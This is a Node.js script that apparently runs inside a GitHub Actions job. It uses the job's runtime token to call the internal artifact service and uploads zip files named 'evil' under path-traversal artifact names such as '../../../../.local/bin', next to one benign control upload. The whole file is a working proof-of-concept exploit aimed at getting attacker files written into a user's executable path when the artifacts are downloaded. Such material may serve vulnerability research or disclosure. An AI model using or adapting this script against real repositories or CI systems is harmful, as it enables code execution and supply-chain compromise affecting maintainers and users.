const fs = require('fs');
const crypto = require('crypto');
const zipFlat = Buffer.from(fs.readFileSync(__dirname + '/evil_gh_flat.b64', 'utf8').trim(), 'base64');
const zipBin = Buffer.from(fs.readFileSync(__dirname + '/evil_gh_bin.b64', 'utf8').trim(), 'base64');
const zipBenign = Buffer.from(fs.readFileSync(__dirname + '/benign.b64', 'utf8').trim(), 'base64');

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
if (!token || !base) { console.log('missing runtime env'); process.exit(1); }
const scp = JSON.parse(Buffer.from(token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString()).scp;
const scope = scp.split(' ').find(s => s.startsWith('Actions.Results:'));
const [_, runBackend, jobBackend] = scope.split(':');

async function twirp(method, body) {
  const r = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/' + method, {
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'Accept': 'application/json', 'Authorization': 'Bearer ' + token},
    body: JSON.stringify(body)
  });
  const txt = await r.text();
  console.log(method + ' http ' + r.status + ' body ' + txt.slice(0, 500));
  try { return JSON.parse(txt); } catch { return {}; }
}

async function upload(name, zip) {
  console.log('--- uploading artifact name=' + JSON.stringify(name));
  const c = await twirp('CreateArtifact', {workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend, name, mime_type: 'application/zip', version: 7});
  if (!c.signed_upload_url) { console.log('NO_UPLOAD_URL for ' + JSON.stringify(name)); return; }
  const put = await fetch(c.signed_upload_url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip', 'x-ms-blob-content-type': 'application/zip'}, body: zip});
  console.log('put status: ' + put.status);
  const hash = crypto.createHash('sha256').update(zip).digest('hex');
  const f = await twirp('FinalizeArtifact', {workflow_run_backend_id: runBackend, workflow_job_run_backend_id: jobBackend, name, size: String(zip.length), hash: 'sha256:' + hash});
  console.log('finalize ok=' + f.ok + ' id=' + f.artifact_id + ' name=' + JSON.stringify(name));
}

(async () => {
  await upload('../../../../.local/bin', zipFlat);
  await upload('../../../../.local/bin/x', zipFlat);
  await upload('../../../../.local', zipBin);
  await upload('plain-doc', zipBenign);
})().catch(e => { console.log('ERR ' + e.message); process.exit(1); });
